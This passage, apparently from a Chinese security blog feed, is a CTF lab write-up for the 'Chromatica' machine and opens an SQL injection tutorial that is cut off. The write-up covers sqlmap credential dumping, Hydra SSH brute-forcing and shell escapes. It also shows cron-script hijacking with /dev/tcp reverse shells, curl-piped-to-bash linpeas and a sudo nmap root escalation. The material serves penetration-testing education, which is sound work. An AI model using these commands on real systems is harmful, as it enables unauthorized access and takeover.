/root/.local/share/sqlmap/output/192.168.56.15/dump/Chromatica/users.csv <br>id,password,username,description<br>1,8d06f5ae0a469178b28bbd34d1da6ef3,admin,admin<br>2,1ea6762d9b86b5676052d1ebd5f649d7,dev,developer account for taz<br>3,3dd0f70a06e2900693fc4b684484ac85 (keeptrying),user,user account for testing<br>4,f220c85e3ff19d043def2578888fb4e5,dev-selim,developer account for selim<br>5,aaf7fb4d4bffb8c8002978a9c9c6ddc9,intern,intern<br><br><br><br><br>┌──(root㉿kali)-[/home/kali/baji/Chromatica]<br>└─# cat /root/.local/share/sqlmap/output/192.168.56.15/dump/Chromatica/users.csv | awk -F, &#x27;&#123;print $2&#125;&#x27; &gt; pass.txt <br>                                                                                                  <br>┌──(root㉿kali)-[/home/kali/baji/Chromatica]<br>└─# cat pass.txt<br>password<br>8d06f5ae0a469178b28bbd34d1da6ef3<br>1ea6762d9b86b5676052d1ebd5f649d7<br>3dd0f70a06e2900693fc4b684484ac85 (keeptrying)<br>f220c85e3ff19d043def2578888fb4e5<br>aaf7fb4d4bffb8c8002978a9c9c6ddc9<br><br></code></pre></td></tr></table></figure><p><a href="https://crackstation.net/">https://crackstation.net/</a></p><p>解码</p><p><img src="/2024/11/06/TestWP/M-1/5.png"></p><p>添加到密码中</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿kali)-[/home/kali/baji/Chromatica]<br>└─#  echo &quot;adm\!n\nflaghere\nkeeptring\nintern00\n&quot; &gt;&gt; pass.txt <br>                                                                                                  <br>┌──(root㉿kali)-[/home/kali/baji/Chromatica]<br>└─# cat pass.txt<br>password<br>8d06f5ae0a469178b28bbd34d1da6ef3<br>1ea6762d9b86b5676052d1ebd5f649d7<br>3dd0f70a06e2900693fc4b684484ac85 (keeptrying)<br>f220c85e3ff19d043def2578888fb4e5<br>aaf7fb4d4bffb8c8002978a9c9c6ddc9<br><br>adm!n<br>flaghere<br>keeptring<br>intern00<br><br></code></pre></td></tr></table></figure><p>使用hydra爆破</p><h2 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿kali)-[/home/kali/baji/Chromatica]<br>└─# hydra -L user.txt -P pass.txt 192.168.56.15 ssh<br>Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).<br><br>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-09 22:13:51<br>[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4<br>[DATA] max 16 tasks per 1 server, overall 16 tasks, 66 login tries (l:6/p:11), ~5 tries per task<br>[DATA] attacking ssh://192.168.56.15:22/<br>[22][ssh] host: 192.168.56.15   login: dev   password: flaghere<br>1 of 1 target successfully completed, 1 valid password found<br>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-11-09 22:14:03<br></code></pre></td></tr></table></figure><p>获取dev：：flaghere</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿kali)-[/home/kali/baji/Chromatica]<br>└─# ssh dev@192.168.56.15<br>dev@192.168.56.15&#x27;s password: <br>GREETINGS,<br>THIS ACCOUNT IS NOT A LOGIN ACCOUNT<br>IF YOU WANNA DO SOME MAINTENANCE ON THIS ACCOUNT YOU HAVE TO<br>EITHER CONTACT YOUR ADMIN<br>OR THINK OUTSIDE THE BOX<br>BE LAZY AND CONTACT YOUR ADMIN<br>OR MAYBE YOU SHOULD USE YOUR HEAD MORE heh,,<br>REGARDS<br><br>brightctf&#123;ALM0ST_TH3R3_34897ffdf69&#125;<br>Connection to 192.168.56.15 closed.<br></code></pre></td></tr></table></figure><p>flag是假的，并且好像被关闭了ssh链接。</p><p>这里可以把终端框缩小。让上面的文字不能够完整显式，这时我们就可以!&#x2F;bash拿到一个bash的用户</p><p><img src="/2024/11/06/TestWP/M-1/6.png"></p><p><img src="/2024/11/06/TestWP/M-1/7.png"></p><p>成功</p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p><img src="/2024/11/06/TestWP/M-1/8.png"></p><p>获取到userflag。</p><p>在目录中还有一个bye.sh</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">dev@Chromatica:~$ cat bye.sh <br><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/bash</span>                                                                                                                                                                                                                                 <br>                                                                                                                                                                                                                                            <br>/usr/bin/more /home/dev/hello.txt                                                                                                                                                                                                           <br>exit 0    <br></code></pre></td></tr></table></figure><p>看起来是这里的问题。查询哪里调用了它</p><p>看下该用户的执行记录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br></pre></td><td class="code"><pre><code class="hljs shell">dev@Chromatica:~$ cat .bash_history <br>cd                                                                                                                                                                                                                                          <br>neofetch                                                                                                                                                                                                                                    <br>TF=$(mktemp)                                                                                                                                                                                                                                <br>echo &#x27;exec /bin/sh&#x27; &gt; $TF                                                                                                                                                                                                                   <br>sudo -l                                                                                                                                                                                                                                     <br>clear                                                                                                                                                                                                                                       <br>ll                                                                                                                                                                                                                                          <br>clear                                                                                                                                                                                                                                       <br>sudo neofetch --config $T                                                                                                                                                                                                                   <br>sudo neofetch --config $TF                                                                                                                                                                                                                  <br>exi                                                                                                                                                                                                                                         <br>exit                                                                                                                                                                                                                                        <br>cd                                                                                                                                                                                                                                          <br>sudo -l                                                                                                                                                                                                                                     <br>sudo -u zenitsu neofetch --config $TF                                                                                                                                                                                                       <br>echo $TF$                                                                                                                                                                                                                                   <br>clear                                                                                                                                                                                                                                       <br>ll                                                                                                                                                                                                                                          <br>clear                                                                                                                                                                                                                                       <br>TF=$(mktemp)                                                                                                                                                                                                                                <br>echo &#x27;exec /bin/sh&#x27; &gt; $TF                                                                                                                                                                                                                   <br>sudo -u zenitsu neofetch --config $TF<br>clear <br>systemctl ssh<br>systemctl status ssh<br>clear<br>ll<br>clear<br>exit<br>clear<br>ls<br>pwd<br>vim hello.txt<br>clear<br>ll<br>more hello.txt <br>vim hello.txt<br>clear<br>more hello.txt <br>exit<br>cd<br>ll<br>vim .bashrc<br>exit<br>./linpeas.sh &gt; security_checks/dev.log<br>./linpeas.sh &gt; security_checks&gt;dev.log<br>./linpeas.sh &gt; security_checks/dev.log<br>ll<br>cd security_checks/<br>ll<br>vim dev.log <br>more dev.log <br>su analyst<br>vim .bashrc<br>cd<br>vim .bashrc <br>ll<br>cd ..<br>ll<br>cd taz/<br>ll<br>clear<br>cd<br>ll<br>ls<br>ls<br>ls -la<br>clear<br>l<br>clear<br>ls .ssh<br>ll<br>ls<br>ls -lah<br>mv .bashrc.bak .bashrc<br>source .bashrc <br>ll<br>cd<br>ll<br>cd<br>vim bye.sh<br>clear<br>ll<br>more .bashrc <br>clear<br>ll<br>vim /etc/ssh/ssh_config<br>ll<br>chmod +x bye.sh <br>clear<br>ll<br>clear<br>ll<br>clear<br>exit<br>clear<br>ll<br>clear<br>ll<br>exit<br>id<br>cat /etc/passwd<br>sudo -l <br>find --help<br>clear<br>find --help<br>man find <br>find / -perm -4000 -type f -ls 2&gt;/dev/null<br>clear<br>ll<br>claer<br>clear<br>cat /etc/crontab<br>clear<br>cat /etc/crontab<br>ll /opt/scripts/end_of_day.sh <br>vim /opt/scripts/end_of_day.sh <br>clear<br>cat /etc/crontab <br>cat /opt/scripts/end_of_day.sh<br>exit<br>su analyst<br>shutdown now<br>clear<br>iptables -L<br>exit<br>clear<br>ls<br>cat hello.txt <br>vim bye.sh <br>ll<br>quit<br>exit<br>clear<br>ls<br>ls /var/www/html/<br>ls<br>ll<br>cd /var/www/<br>ls<br>ll<br>cd html/<br>ms<br>ll<br>cd dev-portal/<br>ls<br>cd assets/<br>ls<br>cd ..<br>ls<br>cd css/<br>ls<br>vim style.css <br>sudo -l<br>clear<br>su -<br>clear<br>ll<br>clear<br>cat /etc/passwd<br>clear<br>sudo -l <br>cler<br>clear<br>su analyst<br>clear<br>ll<br>cat /etc/crontab <br>vim /opt/scripts/end_of_day.sh <br>ls<br>ll<br>sudo su<br>su<br>clear<br>exit<br>ll<br>cat hello.txt <br>ls<br>cat /etc/passwd<br>cat /etc/cronta<br>cat /etc/crontab<br>ll /opt/scripts/end_of_day.sh <br>vim  /opt/scripts/end_of_day.sh <br>cat /opt/scripts/end_of_day.sh <br>cler<br>clear<br>vim /etc/dnsmasq.cinf<br>vim /etc/dnsmasq.conf<br>cat /etc/hosts<br>clear<br>exit<br>clear<br>su - root<br>exit<br>clear<br>ll<br>clear<br>ll<br>clear<br>clear<br>ls<br>cat hello.txt <br>clear<br>ll<br>clear<br>ls<br>ll<br>/bin/bash<br>clear<br>ll<br>clearr<br>clear<br>ls<br>clear<br>ll<br>cat /etc/crontab<br>vim /opt/scripts/end_of_day.sh <br>clear<br>vim /opt/scripts/end_of_day.sh <br>vim /opt/scripts/<br>clear<br>cat /etc/crontab<br>timedatectl<br>clear<br>ls<br>l<br>ll<br>exit<br>clear<br>cat /etc/passwd <br>clear<br>sudo -l <br>clear<br>cat /etc/crontab<br>ll /opt/scripts/end_of_day.sh <br>vim /opt/scripts/end_of_day.sh<br>cat /etc/dnsmasq.conf<br>cat /etc/hosts<br>id<br>hostname<br>curl 192.168.56.1/linpeas.sh|bash<br>/opt/DVWA/vulnerabilities/csrf/test_credentials.php<br>ls -lah<br>cat dev.txt <br>mv dev.txt user.txt<br>cat user.txt <br>cat hello.txt <br>cls<br>ls<br>cat bye.sh <br>cd /opts<br>cd /opt<br>clear<br>ls<br>ls -R<br>clear<br>ls -lahR<br>ls<br>clear<br>ls<br>rm linpeas.sh <br>ls -lh<br>cd scripts/<br>ls<br>cat end_of_day.sh <br>cd ..<br>cd security_checks/<br>ls<br>cat *<br>cls<br>clear<br>ls<br>cat analyst.log <br>cls<br>clearar<br>clear<br>cd ..<br>cd scripts/<br>ls<br>ls -lah<br>cat end_of_day.sh <br>echo &#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.56.1/6666 0&gt;&amp;1&quot;&#x27; &gt;&gt; end_of_day.sh <br>cat end_of_day.sh <br>vi end_of_day.sh <br>clear<br>upgrade<br>exit<br>is<br>id<br>/bin/bash<br>passwd<br>cd /root<br>ls<br>ls -lah<br>cd .ssh<br>ls<br>cat id_ecdsa<br>cat authorized_keys <br>cat id_ecdsa.pub &gt; authorized_keys <br>id<br>bash -p<br>ls<br>exit<br>exit<br>ls /bin/bash<br>ls -lah /bin/bash<br>cd /opt/<br>ls<br>cd scripts/<br>ls<br>cat end_of_day.sh <br>echo &#x27;/bin/bash -i &gt;&amp; /dev/tcp/192.168.56.1/6666 0&gt;&amp;1&#x27; &gt;&gt; end_of_day.sh<br>cat end_of_day.sh <br>cls<br>ls<br>clear<br>ls<br>cat end_of_day.sh <br>echo &#x27;/bin/bash -i &gt;&amp; /dev/tcp/192.168.56.1/6666 0&gt;&amp;1&#x27; &gt;&gt; end_of_day.sh<br>cat end_of_day.sh <br>cls<br>clear<br>cat end_of_day.sh <br>echo &quot;#this is my end of day script&quot; &gt; end_of_day.sh <br>cat end_of_day.sh <br>bash -p<br>ls<br>cat hello.txt<br>cat user.txt<br>sudo -l<br>find / -perm -u=s -type f 2&gt;/dev/null<br>ls<br>ls -al<br>cat bye.sh <br>cat .bash_history <br>cat /opt/scripts/end_of_day.sh <br>cat /etc/cron*<br>echo &quot;bash -i &gt;&amp; /dev/tcp/192.168.56.4/1234 0&gt;&amp;1&quot; &gt; /opt/scripts/end_of_day.sh <br>ls<br><br></code></pre></td></tr></table></figure><p><img src="/2024/11/06/TestWP/M-1/9.png"><br><img src="/2024/11/06/TestWP/M-1/10.png"><br><img src="/2024/11/06/TestWP/M-1/11.png"></p><p>看起来这个sh文件是在ssh配置中的，当我们ssh登录时就会强制执行此文件让我们的ssh连接退出</p><p>且还发现了在&#x2F;opt&#x2F;scripts&#x2F;end_of_day.sh 的可执行文件可能为定时任务。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs shell">dev@Chromatica:~$ cat /etc/crontab <br><span class="hljs-meta prompt_"># </span><span class="language-bash">/etc/crontab: system-wide crontab</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">Unlike any other crontab you don<span class="hljs-string">&#x27;t have to run the `crontab&#x27;</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">command</span> to install the new version when you edit this file</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">and files <span class="hljs-keyword">in</span> /etc/cron.d. These files also have username fields,</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">that none of the other crontabs <span class="hljs-keyword">do</span>.</span><br><br>SHELL=/bin/sh<br><span class="hljs-meta prompt_"># </span><span class="language-bash">You can also override PATH, but by default, newer versions inherit it from the environment</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">Example of job definition:</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">.---------------- minute (0 - 59)</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">|  .------------- hour (0 - 23)</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">|  |  .---------- day of month (1 - 31)</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">|  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">|  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">|  |  |  |  |</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">*  *  *  *  * user-name <span class="hljs-built_in">command</span> to be executed</span><br>17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly<br>25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )<br>47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )<br>52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )<br>* *     * * *   analyst /bin/bash /opt/scripts/end_of_day.sh<br><br></code></pre></td></tr></table></figure><p>确实是定时任务，进行反弹shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">dev@Chromatica:~$ cat /opt/scripts/end_of_day.sh <br><span class="hljs-meta prompt_">#</span><span class="language-bash">this is my end of day script</span><br>dev@Chromatica:~$ echo &quot;bash -i &gt;&amp; /dev/tcp/192.168.56.4/1234 0&gt;&amp;1&quot; &gt; /opt/scripts/end_of_day.sh <br>dev@Chromatica:~$ cat /opt/scripts/end_of_day.sh <br>bash -i &gt;&amp; /dev/tcp/192.168.56.4/1234 0&gt;&amp;1<br><br></code></pre></td></tr></table></figure><p>等待</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(root㉿kali)-[/home/kali/baji/Chromatica]<br>└─# nc -lvnp 1234                    <br>listening on [any] 1234 ...<br>connect to [192.168.56.4] from (UNKNOWN) [192.168.56.15] 58340<br>bash: cannot set terminal process group (1900): Inappropriate ioctl for device<br>bash: no job control in this shell<br>analyst@Chromatica:~$ id<br>id<br>uid=1002(analyst) gid=1002(analyst) groups=1002(analyst)<br><br><br>analyst@Chromatica:~$ cat a<br>cat analyst.txt <br>brightctf&#123;GAZETTO_RUKI_b2f4f50f398&#125;<br></code></pre></td></tr></table></figure><p>现在进行root提权</p><h1 id="root提权"><a href="#root提权" class="headerlink" title="root提权"></a>root提权</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs shell">analyst@Chromatica:~$ sudo -l<br>sudo -l<br>Matching Defaults entries for analyst on Chromatica:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,<br>    use_pty<br><br>User analyst may run the following commands on Chromatica:<br>    (ALL : ALL) NOPASSWD: /usr/bin/nmap<br>analyst@Chromatica:~$ TF=$(mktemp)<br>TF=$(mktemp)<br>analyst@Chromatica:~$ echo &#x27;os.execute(&quot;/bin/sh&quot;)&#x27; &gt; $TF<br>echo &#x27;os.execute(&quot;/bin/sh&quot;)&#x27; &gt; $TF<br>analyst@Chromatica:~$ sudo nmap --script=$TF<br>sudo nmap --script=$TF<br>Starting Nmap 7.80 ( https://nmap.org ) at 2024-11-10 03:24 UTC<br>NSE: Warning: Loading &#x27;/tmp/tmp.Smvzxjn9Bu&#x27; -- the recommended file extension is &#x27;.nse&#x27;.<br>id<br>uid=0(root) gid=0(root) groups=0(root)<br>cat /root/root.txt<br>brightctf&#123;DIR_EN_GREY_59ce1d6c207&#125;<br></code></pre></td></tr></table></figure><p>cx 师傅说：flag 别不打靶机就交，只冲榜是没有意义的。</p>]]></content>
    
    
    <categories>
      
      <category>cx的渗透日记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入</title>
    <link href="/2024/11/10/SQL%E6%B3%A8%E5%85%A5/"/>
    <url>/2024/11/10/SQL%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<p>以前一直搞不太懂 SQL 注入的一些东西，不知道为什么要加单引号或双引号，为什么有时候用 and 但有时候又用 or，最近看了一些 SQL 注入知识点，所以总结一些 qwq</p><span id="more"></span><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>寻找功能点进行测试，达到非预期执行数据库语句</p><p>比如</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> username,password from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span> = butt3rf1y;<br></code></pre></td></tr></table></figure><p>一般在以下地方容易存在注入点：</p><p>URL参数：例如在查询字符串或路径中</p><p>表单输入：应用程序中的表单输入框，如用户名、密码、搜索框等，如果没有进行充分的输入验证和过滤，就可能成为 SQL 注入的目标</p><p>Cookie：如果应用程序使用 Cookie 来存储用户信息或会话状态，可以通过修改 Cookie 中的值来进行 SQL 注入</p><p>HTTP头部：有些应用程序可能会从 HTTP 头部中获取数据，可以在 HTTP 头部中进行 SQL 注入</p><p>数据库查询语句：如果有源码，直接进行代码审计，可能有直接拼接 SQL 查询语句的地方，存在 SQL 注入</p><h2 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h2><p><img src="/2024/11/06/TestWP/QLschema.png"></p><p>如上图，数据库的结构为</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs livescript">+数据库 <span class="hljs-function"><span class="hljs-params">(database)</span>--&gt;</span>ctf_database<br>+ - 表_user <span class="hljs-function"><span class="hljs-params">(table_user)</span>--&gt;</span>user<br>+ - 表_users <span class="hljs-function"><span class="hljs-params">(table_users)</span>--&gt;</span>users<br>+ + - 列_id <span class="hljs-function"><span class="hljs-params">(column_id)</span>--&gt;</span>id<br>+ + - 列_username <span 